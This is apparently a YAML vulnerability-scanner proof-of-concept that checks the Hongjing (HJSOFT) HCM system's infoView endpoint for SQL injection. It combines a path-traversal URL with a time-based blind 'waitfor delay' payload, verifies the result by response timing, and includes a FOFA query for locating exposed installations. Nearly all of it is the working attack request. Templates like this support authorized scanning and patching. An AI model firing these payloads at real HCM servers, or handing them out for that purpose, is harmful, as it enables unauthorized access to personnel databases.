id: poc-yaml-hjsoft-hcm-general-info-view-sqli
info:
  name: 宏景HCM系统infoView处存在sql注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 宏景 HCM
  fofa: app="HJSOFT-HCM"
variables:
  t1: random_int(5,9)
  t2: t1 + 2
  t3: random_int(1,4)
  t4: t3 + 2
requests:
- method: GET
  path: /templates/attestation/../../general/info/view?kind=1&a0100=1';waitfor+delay+'0:0:{{.t1}}'+--
  expression: "status_code == 200 && \ntrim(body) == \"\" &&\nduration >= t1 &&\n\
    duration <= t2 \n"
- method: GET
  path: /templates/attestation/../../general/info/view?kind=1&a0100=1';waitfor+delay+'0:0:{{.t3}}'+--
  expression: "status_code == 200 && \ntrim(body) == \"\" &&\nduration >= t3 &&\n\
    duration <= t4\n"
transport: http
